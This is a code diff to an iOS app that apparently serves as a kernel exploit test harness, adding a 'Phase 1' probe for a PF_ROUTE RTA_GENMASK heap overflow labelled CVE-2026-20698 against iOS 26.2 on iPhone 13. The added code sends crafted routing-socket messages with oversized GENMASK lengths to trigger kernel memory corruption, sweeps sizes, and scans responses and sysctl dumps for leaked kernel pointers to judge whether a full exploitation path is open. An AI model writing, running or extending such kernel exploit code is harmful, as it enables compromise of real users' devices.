@@ -145,6 +145,8 @@ static const char kOpenPropertiesGarbage[] =
 @property (nonatomic, strong) UIButton   *deepProbeButton;
 @property (nonatomic, strong) UIButton   *lifecycleButton;
 @property (nonatomic, strong) UIButton   *aioUafButton;
+@property (nonatomic, strong) UIButton   *pfRouteProbeButton;
+@property (nonatomic, assign) int         pfRoutePhase;
 @property (nonatomic, strong) UITextView *logView;
 @property (nonatomic, assign) int  proofCrossClientEvents;
 @property (nonatomic, assign) int  proofCrossClientChecks;
@@ -233,7 +235,53 @@ static const char kOpenPropertiesGarbage[] =
                    raceService:(io_service_t)raceService;
 - (void)runUninitBufferProbe:(io_service_t)raceService;
 - (void)runRemapAfterFreeProbe:(io_service_t)raceService;
+- (void)pfRouteProbeTapped;
+- (void)runPFRouteProbe;
 @end
+
+// =======================================================================
+// CVE-2026-20698: PF_ROUTE RTA_GENMASK Heap Overflow
+// Target: iOS 26.2 (xnu-12377.62.10), iPhone 13 (A15)
+// v1 — Phase 1: Vulnerability Probe
+// =======================================================================
+// COMPLETELY INDEPENDENT from AIO UAF (CVE-2026-XNU-AIO-KEVENT-UAF).
+// No shared state, no shared threads, no shared kqueue/fd resources.
+// Isolation: separate button, separate dispatch queue, separate file I/O.
+// =======================================================================
+
+#define RTM_VERSION   5
+#define RTM_GET       4
+#define RTA_DST       0x01
+#define RTA_GATEWAY   0x02
+#define RTA_NETMASK   0x04
+#define RTA_GENMASK   0x08
+#define RTA_IFP       0x10
+#define RTA_IFA       0x20
+#define RTA_AUTHOR    0x40
+#define RTA_BRD       0x80
+
+struct pf_rt_metrics {
+    uint32_t rmx_locks, rmx_mtu, rmx_hopcount;
+    int32_t  rmx_expire;
+    uint32_t rmx_recvpipe, rmx_sendpipe, rmx_ssthresh;
+    uint32_t rmx_rtt, rmx_rttvar, rmx_pksent, rmx_state;
+    uint32_t rmx_filler[3];
+};
+
+struct pf_rt_msghdr {
+    unsigned short rtm_msglen;
+    unsigned char  rtm_version;
+    unsigned char  rtm_type;
+    unsigned short rtm_index;
+    int            rtm_flags;
+    int            rtm_addrs;
+    int            rtm_pid;
+    int            rtm_seq;
+    int            rtm_errno;
+    int            rtm_use;
+    unsigned int   rtm_inits;
+    struct pf_rt_metrics rtm_rmx;
+};
 
 // ---- XNU AIO Kevent UAF helpers ----
 // CVE-2026-XXXX: Double-free in kern_aio.c, patched in iOS 26.3.
@@ -585,6 +633,15 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
+    self.pfRouteProbeButton = [UIButton buttonWithType:UIButtonTypeSystem];
+    self.pfRouteProbeButton.translatesAutoresizingMaskIntoConstraints = NO;
+    UIButtonConfiguration *pfConf = [UIButtonConfiguration filledButtonConfiguration];
+    pfConf.baseBackgroundColor = [UIColor systemGreenColor];
+    self.pfRouteProbeButton.configuration = pfConf;
+    [self.pfRouteProbeButton setTitle:@"CVE-2026-20698 v1 Probe" forState:UIControlStateNormal];
+    [self.pfRouteProbeButton addTarget:self action:@selector(pfRouteProbeTapped) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:self.pfRouteProbeButton];
+
     self.logView = [[UITextView alloc] initWithFrame:CGRectZero];
     self.logView.translatesAutoresizingMaskIntoConstraints = NO;
     self.logView.editable = NO;
@@ -601,7 +658,10 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self.aioUafButton.topAnchor constraintEqualToAnchor:self.lifecycleButton.bottomAnchor constant:12],
         [self.aioUafButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
         [self.aioUafButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
-        [self.logView.topAnchor constraintEqualToAnchor:self.aioUafButton.bottomAnchor constant:20],
+        [self.pfRouteProbeButton.topAnchor constraintEqualToAnchor:self.aioUafButton.bottomAnchor constant:12],
+        [self.pfRouteProbeButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
+        [self.pfRouteProbeButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
+        [self.logView.topAnchor constraintEqualToAnchor:self.pfRouteProbeButton.bottomAnchor constant:20],
         [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
         [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
         [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-16],
@@ -6469,6 +6529,390 @@ cleanup:
             });
         }  // @autoreleasepool
     });  // dispatch_async
+}
+
+// =======================================================================
+// PF_ROUTE RTA_GENMASK Heap Overflow Probe (CVE-2026-20698)
+// =======================================================================
+
+- (void)pfRouteProbeTapped {
+    static volatile int32_t _pfRunning = 0;
+    if (!__sync_bool_compare_and_swap(&_pfRunning, 0, 1)) {
+        [self appendLog:@"⚠ PF_ROUTE probe already running"];
+        return;
+    }
+
+    @synchronized([ViewController class]) {
+        static int64_t _pfLast = 0;
+        int64_t now = (int64_t)([[NSDate date] timeIntervalSince1970] * 1000);
+        if (now - _pfLast < 3000) {
+            _pfRunning = 0;
+            [self appendLog:@"⚠ Debounced"];
+            return;
+        }
+        _pfLast = now;
+    }
+
+    [self appendLog:@"\n============================================================"];
+    [self appendLog:@"  CVE-2026-20698 v1 — PF_ROUTE Heap Overflow Probe"];
+    [self appendLog:@"  Target: iOS 26.2 (xnu-12377.62.10) | iPhone 13 (A15)"];
+    [self appendLog:@"  ISOLATED from AIO UAF: separate socket, no shared state"];
+    [self appendLog:@"============================================================"];
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+        self.pfRouteProbeButton.enabled = NO;
+        [self.pfRouteProbeButton setTitle:@"Probing..." forState:UIControlStateNormal];
+    });
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            [self runPFRouteProbe];
+            _pfRunning = 0;
+            dispatch_async(dispatch_get_main_queue(), ^{
+                self.pfRouteProbeButton.enabled = YES;
+                [self.pfRouteProbeButton setTitle:@"CVE-2026-20698 v1 Probe" forState:UIControlStateNormal];
+            });
+        }
+    });
+}
+
+static BOOL pf_scanForKernelPtr(const uint8_t *buf, size_t len, const char *label, NSMutableString *out) {
+    int found = 0;
+    for (size_t i = 0; i + 7 < len; i += 4) {
+        uint64_t v = *(uint64_t*)(buf + i);
+        if ((v >> 40) == 0xffffff || (v >> 40) == 0xfffffe) {
+            if (found == 0) {
+                [out appendFormat:@"  [%s] KERNEL POINTERS:\n", label];
+            }
+            [out appendFormat:@"    offset +%zu: 0x%016llx\n", i, v];
+            found++;
+            if (found >= 8) {
+                [out appendFormat:@"    ... (%d+ total)\n", found];
+                break;
+            }
+        }
+    }
+    if (found == 0) {
+        [out appendFormat:@"  [%s] No kernel pointers found\n", label];
+    }
+    return (found > 0);
+}
+
+static int pf_sendRouteMsg(int type, int addrs, const void *sas, int sa_len,
+                            void *respBuf, size_t respSize, ssize_t *outRead) {
+    int fd = socket(PF_ROUTE, SOCK_RAW, 0);
+    if (fd < 0) return -errno;
+
+    char buf[2048];
+    memset(buf, 0, sizeof(buf));
+    struct pf_rt_msghdr *rtm = (struct pf_rt_msghdr *)buf;
+    rtm->rtm_type = type;
+    rtm->rtm_version = RTM_VERSION;
+    rtm->rtm_seq = 1;
+    rtm->rtm_addrs = addrs;
+    if (sa_len > 0 && sas) {
+        memcpy(buf + sizeof(*rtm), sas, sa_len);
+    }
+    rtm->rtm_msglen = sizeof(*rtm) + sa_len;
+
+    ssize_t s = write(fd, buf, rtm->rtm_msglen);
+    int write_err = (s < 0) ? errno : 0;
+
+    *outRead = -1;
+    if (s > 0 && respBuf && respSize > 0) {
+        struct timeval tv = {.tv_sec = 0, .tv_usec = 200000};
+        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+        *outRead = read(fd, respBuf, respSize);
+    }
+    close(fd);
+    return write_err;
+}
+
+- (void)runPFRouteProbe {
+    NSMutableString *log = [NSMutableString string];
+
+    // ============================================================
+    // TEST 1: Safe baseline — RTM_GET DST-only (no GENMASK)
+    // ============================================================
+    [log appendString:@"\n--- TEST 1: Safe Baseline (RTM_GET + DST only, no GENMASK) ---\n"];
+
+    struct sockaddr_in sin_dst;
+    memset(&sin_dst, 0, sizeof(sin_dst));
+    sin_dst.sin_family = AF_INET;
+    sin_dst.sin_len = sizeof(sin_dst);
+    sin_dst.sin_addr.s_addr = inet_addr("8.8.8.8");
+
+    char resp[4096];
+    ssize_t rlen = 0;
+    int err = pf_sendRouteMsg(RTM_GET, RTA_DST, &sin_dst, sizeof(sin_dst),
+                               resp, sizeof(resp), &rlen);
+    [log appendFormat:@"  write() err=%d, read()=%zd bytes\n", err, rlen];
+
+    if (rlen > 0) {
+        struct pf_rt_msghdr *r = (struct pf_rt_msghdr *)resp;
+        [log appendFormat:@"  response: type=%u errno=%d addrs=0x%x msglen=%u\n",
+            r->rtm_type, r->rtm_errno, r->rtm_addrs, r->rtm_msglen];
+        // hex dump first 128 bytes
+        [log appendString:@"  hex[0..128]: "];
+        for (int i = 0; i < 128 && i < rlen; i++) {
+            [log appendFormat:@"%02x", (unsigned char)resp[i]];
+            if ((i+1) % 64 == 0) [log appendString:@"\n              "];
+        }
+        [log appendString:@"\n"];
+        pf_scanForKernelPtr((uint8_t*)resp, rlen, "baseline", log);
+    } else {
+        [log appendFormat:@"  PF_ROUTE may be restricted on this device (errno=%d)\n",
+            rlen < 0 ? errno : 0];
+    }
+
+    // ============================================================
+    // TEST 2: Bounds-safety detection — oversized genmask
+    // ============================================================
+    [log appendString:@"\n--- TEST 2: Bounds-Safety Detection (oversized GENMASK) ---\n"];
+    [log appendString:@"  WARNING: If device panics here, iOS 26.2 has -fbounds-safety.\n"];
+    [log appendString:@"  This is the critical test — determines full exploit path.\n"];
+
+    // We'll test increasing sa_len values: 4, 8, 16, 32, 33, 48, 64, 128
+    // AF_INET crashes at sa_len >= 33 on -fbounds-safety builds
+    // If the device survives sa_len=48, silent overflow is available
+
+    // First, pre-flight: write a marker file so we know we were here
+    NSString *markerPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"pf_probe_test2_start.txt"];
+    [@"test2_start" writeToFile:markerPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
+
+    int crashLens[] = {4, 8, 16, 32, 33, 48, 64, 128};
+    int numLens = sizeof(crashLens) / sizeof(crashLens[0]);
+    int survivedCount = 0;
+
+    for (int ti = 0; ti < numLens; ti++) {
+        int gm_len = crashLens[ti];
+
+        char sa_buf[256];
+        memset(sa_buf, 0, sizeof(sa_buf));
+        // DST sockaddr
+        struct sockaddr_in *dst = (struct sockaddr_in *)sa_buf;
+        dst->sin_family = AF_INET;
+        dst->sin_len = sizeof(*dst);
+        dst->sin_addr.s_addr = inet_addr("8.8.8.8");
+        int off = sizeof(*dst);
+
+        // GENMASK sockaddr with controlled sa_len
+        sa_buf[off] = gm_len;
+        sa_buf[off+1] = AF_INET;
+        // Fill with 0xFF pattern for easy identification in dumps
+        for (int b = 2; b < gm_len && b < 255; b++) {
+            sa_buf[off+b] = 0xFF;
+        }
+        int padded = (gm_len + 3) & ~3;
+        if (padded < 4) padded = 4;
+        off += padded;
+
+        // Write crash-site marker before each attempt
+        NSString *sitePath = [NSTemporaryDirectory()
+            stringByAppendingPathComponent:[NSString stringWithFormat:@"pf_t2_sa%d.txt", gm_len]];
+        [[NSString stringWithFormat:@"test2_sa_len_%d", gm_len]
+            writeToFile:sitePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
+
+        [log appendFormat:@"  sa_len=%d (family=AF_INET)...", gm_len];
+
+        memset(resp, 0, sizeof(resp));
+        rlen = 0;
+        err = pf_sendRouteMsg(RTM_GET, RTA_DST | RTA_GENMASK, sa_buf, off,
+                               resp, sizeof(resp), &rlen);
+
+        if (rlen > 0) {
+            survivedCount++;
+            struct pf_rt_msghdr *r = (struct pf_rt_msghdr *)resp;
+            [log appendFormat:@" SURVIVED — read=%zd, type=%u, err=%d, addrs=0x%x\n",
+                rlen, r->rtm_type, r->rtm_errno, r->rtm_addrs];
+            // Quick scan for leaked pointers in response
+            NSString *subLabel = [NSString stringWithFormat:@"sa%d", gm_len];
+            pf_scanForKernelPtr((uint8_t*)resp, rlen, subLabel.UTF8String, log);
+        } else {
+            [log appendFormat:@" FAIL — write=%d, read=%zd, errno=%d\n",
+                err, rlen, rlen < 0 ? errno : 0];
+        }
+
+        // Remove marker to track progress
+        [[NSFileManager defaultManager] removeItemAtPath:sitePath error:nil];
+    }
+
+    [log appendFormat:@"\n  Survived %d/%d GENMASK tests\n", survivedCount, numLens];
+    if (survivedCount == numLens) {
+        [log appendString:@"  *** ALL SURVIVED: iOS 26.2 does NOT have -fbounds-safety on this path!\n"];
+        [log appendString:@"  *** Silent heap overflow is available — full exploitation path is OPEN.\n"];
+    } else if (survivedCount > 0) {
+        [log appendFormat:@"  *** PARTIAL: survived sa_len <= %d, crash beyond\n",
+            crashLens[survivedCount - 1]];
+    } else {
+        [log appendString:@"  *** NONE survived: -fbounds-safety active. Need bypass strategy.\n"];
+    }
+
+    // Clean up marker
+    [[NSFileManager defaultManager] removeItemAtPath:markerPath error:nil];
+
+    // ============================================================
+    // TEST 3: Family enumeration with safe sa_len
+    // ============================================================
+    [log appendString:@"\n--- TEST 3: Family Enumeration (safe sa_len=16) ---\n"];
+
+    int families[] = {0, 1, 2, 14, 17, 18, 24, 28, 30};
+    const char *famNames[] = {"AF_UNSPEC","AF_UNIX","AF_INET","AF_IMPLINK",
+                               "AF_INET6_ALT","AF_LINK","AF_NATM","AF_PPP","AF_INET6"};
+    int numFams = sizeof(families) / sizeof(families[0]);
+
+    for (int fi = 0; fi < numFams; fi++) {
+        int fm = families[fi];
+
+        char sa_fb[256];
+        memset(sa_fb, 0, sizeof(sa_fb));
+        struct sockaddr_in *d = (struct sockaddr_in *)sa_fb;
+        d->sin_family = AF_INET;
+        d->sin_len = sizeof(*d);
+        d->sin_addr.s_addr = inet_addr("8.8.8.8");
+        int o = sizeof(*d);
+
+        sa_fb[o] = 16;        // sa_len = 16 (safe for all families)
+        sa_fb[o+1] = fm;      // family = test family
+        int pad = (16 + 3) & ~3;
+        o += pad;
+
+        [log appendFormat:@"  %s (fam=%d)...", famNames[fi], fm];
+
+        memset(resp, 0, sizeof(resp));
+        rlen = 0;
+        err = pf_sendRouteMsg(RTM_GET, RTA_DST | RTA_GENMASK, sa_fb, o,
+                               resp, sizeof(resp), &rlen);
+        if (rlen > 0) {
+            struct pf_rt_msghdr *r = (struct pf_rt_msghdr *)resp;
+            [log appendFormat:@" OK type=%u err=%d addrs=0x%x\n",
+                r->rtm_type, r->rtm_errno, r->rtm_addrs];
+        } else {
+            [log appendFormat:@" write=%d read=%zd\n", err, rlen];
+        }
+    }
+
+    // ============================================================
+    // TEST 4: sa_len sweep for surviving families
+    // ============================================================
+    [log appendString:@"\n--- TEST 4: sa_len Sweep (AF_INET, sa_len=4..128) ---\n"];
+
+    int sweepLens[] = {4, 8, 12, 16, 20, 24, 28, 32, 33, 36, 40, 44, 48,
+                        56, 64, 72, 80, 96, 128};
+    int numSweep = sizeof(sweepLens) / sizeof(sweepLens[0]);
+
+    for (int si = 0; si < numSweep; si++) {
+        int sl = sweepLens[si];
+
+        char sw_buf[256];
+        memset(sw_buf, 0, sizeof(sw_buf));
+        struct sockaddr_in *dd = (struct sockaddr_in *)sw_buf;
+        dd->sin_family = AF_INET;
+        dd->sin_len = sizeof(*dd);
+        dd->sin_addr.s_addr = inet_addr("1.1.1.1");  // different IP for new route lookup
+        int oo = sizeof(*dd);
+
+        sw_buf[oo] = sl;
+        sw_buf[oo+1] = AF_INET;
+        for (int b = 2; b < sl && b < 255; b++) {
+            sw_buf[oo+b] = (unsigned char)(0xA0 + (b & 0x0F));  // unique pattern per byte
+        }
+        int pad = (sl + 3) & ~3;
+        if (pad < 4) pad = 4;
+        oo += pad;
+
+        memset(resp, 0, sizeof(resp));
+        rlen = 0;
+        err = pf_sendRouteMsg(RTM_GET, RTA_DST | RTA_GENMASK, sw_buf, oo,
+                               resp, sizeof(resp), &rlen);
+
+        BOOL hasKptr = NO;
+        if (rlen > 0) {
+            struct pf_rt_msghdr *r = (struct pf_rt_msghdr *)resp;
+            int resp_err = r->rtm_errno;
+            NSString *tag = [NSString stringWithFormat:@"sweep_sa%d", sl];
+            hasKptr = pf_scanForKernelPtr((uint8_t*)resp, rlen, tag.UTF8String, log);
+            if (!hasKptr) {
+                [log appendFormat:@"  sa_len=%d: %zd bytes err=%d — no kptr\n", sl, rlen, resp_err];
+            }
+        } else {
+            [log appendFormat:@"  sa_len=%d: write=%d read=%zd — no response\n", sl, err, rlen];
+        }
+    }
+
+    // ============================================================
+    // TEST 5: sysctl NET_RT_DUMP kernel pointer scan
+    // ============================================================
+    [log appendString:@"\n--- TEST 5: sysctl NET_RT_DUMP kernel pointer scan ---\n"];
+
+    int mib[] = {4, 17, 0, AF_INET, 1, 0};  // CTL_NET, PF_ROUTE, 0, AF_INET, NET_RT_DUMP
+    size_t needed = 0;
+    if (sysctl(mib, 6, NULL, &needed, NULL, 0) == 0 && needed > 0 && needed < 2*1024*1024) {
+        [log appendFormat:@"  NET_RT_DUMP needs %zu bytes, fetching...\n", needed];
+        char *rtbuf = (char*)malloc(needed);
+        if (rtbuf && sysctl(mib, 6, rtbuf, &needed, NULL, 0) == 0) {
+            pf_scanForKernelPtr((uint8_t*)rtbuf, needed, "RT_DUMP", log);
+        }
+        free(rtbuf);
+    } else {
+        [log appendFormat:@"  NET_RT_DUMP failed or too large (needed=%zu)\n", needed];
+    }
+
+    // ============================================================
+    // TEST 6: RTM_GET with all address flags (stress test)
+    // ============================================================
+    [log appendString:@"\n--- TEST 6: All RTA flags (DST+GW+MASK+GENMASK) ---\n"];
+
+    {
+        char full_buf[512];
+        memset(full_buf, 0, sizeof(full_buf));
+        int o = 0;
+        // DST: 8.8.8.8
+        struct sockaddr_in *sd = (struct sockaddr_in *)(full_buf + o);
+        sd->sin_family = AF_INET; sd->sin_len = sizeof(*sd);
+        sd->sin_addr.s_addr = inet_addr("8.8.8.8"); o += sizeof(*sd);
+        // GW: 192.168.1.1
+        struct sockaddr_in *sg = (struct sockaddr_in *)(full_buf + o);
+        sg->sin_family = AF_INET; sg->sin_len = sizeof(*sg);
+        sg->sin_addr.s_addr = inet_addr("192.168.1.1"); o += sizeof(*sg);
+        // NETMASK: 255.255.255.0
+        struct sockaddr_in *sm = (struct sockaddr_in *)(full_buf + o);
+        sm->sin_family = AF_INET; sm->sin_len = sizeof(*sm);
+        sm->sin_addr.s_addr = inet_addr("255.255.255.0"); o += sizeof(*sm);
+        // GENMASK: 255.255.0.0
+        struct sockaddr_in *sgm = (struct sockaddr_in *)(full_buf + o);
+        sgm->sin_family = AF_INET; sgm->sin_len = sizeof(*sgm);
+        sgm->sin_addr.s_addr = inet_addr("255.255.0.0"); o += sizeof(*sgm);
+
+        int allFlags = RTA_DST | RTA_GATEWAY | RTA_NETMASK | RTA_GENMASK;
+        memset(resp, 0, sizeof(resp));
+        rlen = 0;
+        err = pf_sendRouteMsg(RTM_GET, allFlags, full_buf, o, resp, sizeof(resp), &rlen);
+        [log appendFormat:@"  All-flags RTM_GET: write=%d, read=%zd\n", err, rlen];
+        if (rlen > 0) {
+            struct pf_rt_msghdr *r = (struct pf_rt_msghdr *)resp;
+            [log appendFormat:@"  type=%u err=%d addrs=0x%x\n", r->rtm_type, r->rtm_errno, r->rtm_addrs);
+            pf_scanForKernelPtr((uint8_t*)resp, rlen, "allFlags", log);
+        }
+    }
+
+    // ============================================================
+    // SUMMARY
+    // ============================================================
+    [log appendString:@"\n========== PF_ROUTE Probe Complete =========="];
+    [log appendString:@"\nTest 1: Safe baseline — confirms PF_ROUTE is accessible"];
+    [log appendString:@"\nTest 2: Bounds-safety — THE critical test for exploit viability"];
+    [log appendString:@"\nTest 3: Family enum — which families are usable"];
+    [log appendString:@"\nTest 4: sa_len sweep — overflow distance + leak potential"];
+    [log appendString:@"\nTest 5: sysctl dump — orthogonal leak channel"];
+    [log appendString:@"\nTest 6: All flags — complex message handling"];
+
+    // Write results to file for post-reboot analysis
+    NSString *resultPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"pf_probe_results.txt"];
+    [log writeToFile:resultPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [self appendLog:log];
+    });
 }
 
 @end
